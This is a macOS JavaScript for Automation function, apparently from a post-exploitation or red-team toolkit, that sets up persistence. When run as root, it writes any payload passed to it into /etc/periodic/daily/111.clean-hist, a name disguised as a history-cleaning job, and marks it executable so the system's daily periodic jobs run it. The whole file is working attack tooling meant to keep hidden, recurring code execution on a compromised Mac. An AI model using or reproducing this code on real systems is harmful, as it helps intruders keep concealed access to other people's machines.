//Requires root
function PeriodicPersist(periodicJobaction){

ObjC.import('Foundation')
ObjC.import('stdlib')
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

var userName = currentApp.systemInfo().shortUserName
var output = ""
try{
if (userName != 'root')
{ 
	output += "Requires root"
} else
{

function executeBackground(binPath,arg1,arg2,arg3){
	var path = binPath 
	var args = [arg1,arg2,arg3]
	var pipe = $.NSPipe.pipe;
	var file = pipe.fileHandleForReading;
	var task = $.NSTask.alloc.init;
	task.launchPath = path;
	task.arguments = args;
	task.standardOutput = pipe; 
	task.standardError = pipe;
	task.launch; 
	let data = file.readDataToEndOfFile; 
    file.closeFile;
    response = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;
	return response
	}

var periodicFilepath = "/etc/periodic/daily/111.clean-hist"
function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = currentApp.openForAccess(Path(fileString), { writePermission: true })
        if (overwriteExistingContent) {
            currentApp.setEof(openedFile, { to: 0 })
        }
        currentApp.write(text, { to: openedFile, startingAt: currentApp.getEof(openedFile) })
        currentApp.closeAccess(openedFile)
}
writeTextToFile(periodicJobaction, periodicFilepath, true)

executeBackground("/bin/chmod","+x",periodicFilepath,"&")
output += "Periodic Persistence installed at etc/periodic/daily/111.clean-hist"
}
}catch(error){
       output += error.toString()
		}
        	return output
}
